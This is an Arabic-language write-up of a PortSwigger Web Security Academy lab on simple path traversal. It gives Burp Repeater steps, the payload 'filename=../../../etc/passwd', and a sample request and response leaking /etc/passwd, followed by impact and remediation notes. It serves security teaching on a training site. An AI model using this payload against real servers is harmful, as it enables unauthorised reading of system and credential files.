# Lab 01 — File Path Traversal, Simple Case (الحالة البسيطة المباشرة)

[![التصنيف](https://img.shields.io/badge/الفئة-Path%20Traversal-purple)]()
[![النوع](https://img.shields.io/badge/النوع-Path%20Traversal%20—%20No%20Sanitization%20(غياب%20تام%20للحماية)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> هذا الشرح جزء من سلسلة [معامل اجتياز المسارات (Path Traversal)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 01 — File Path Traversal, Simple Case (الحالة البسيطة المباشرة) |
| **تصنيف الثغرة** | Path Traversal — No Sanitization (غياب تام للحماية) |
| **معيار الضعف (CWE)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | استخراج محتوى ملف /etc/passwd عبر باراميتر تحميل الصور دون وجود أي فلتر. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يقوم التطبيق بعرض صور المنتجات عبر رابط: `GET /image?filename=53.jpg`. في الباك إند، يقوم الكود بأخذ اسم الملف ودمجه مع مسار مجلد الصور: `/var/www/images/ + filename`.

**الخلل الفكري هنا:** لا توجد أي معالجة أو تصفية على الإطلاق للمدخلات! عندما يضع المستخدم تتابع الهروب `../` (Dot-Dot-Slash)، يفسره نظام التشغيل كأمر "ارجع مجلداً واحداً للوراء". بتكرار `../../../etc/passwd`، يرجع المسار إلى جذر السيرفر (`/`) ثم يدخل إلى `/etc/passwd` ويقرأه السيرفر للمستخدم كأنه صورة!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل غياب الفلترة لتسلق شجرة المجلدات بالرجوع للخلف باستخدام `../` والوصول لملفات النظام.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور قام بالدمج النصي المباشر لمدخل المستخدم في دالة فتح الملفات دون أي تحقق.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. تصفح أي منتج وافتح صورته في تبويب جديد أو اعترض الطلب في Burp Suite.
2. ستجد الطلب كالتالي:
`GET /image?filename=53.jpg HTTP/1.1`.
3. أرسل الطلب إلى **Burp Repeater** (`Ctrl+R`).
4. قم بتغيير قيمة الباراميتر لتصبح:
`filename=../../../etc/passwd`.
5. اضغط Send، ستجد أن السيرفر أعاد استجابة `200 OK` وفي جسم الاستجابة محتوى ملف `/etc/passwd` كاملاً ويبدأ بـ `root:x:0:0...`.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

قراءة كاملة لأي ملف على السيرفر، وسرقة بيانات المستخدمين وملفات التكوين وكود الباك إند.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

التحقق من المسار النهائي باستخدام الدوال القياسية (Canonicalization) أو استخدام معرّفات وسيطة بدلاً من أسماء الملفات.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
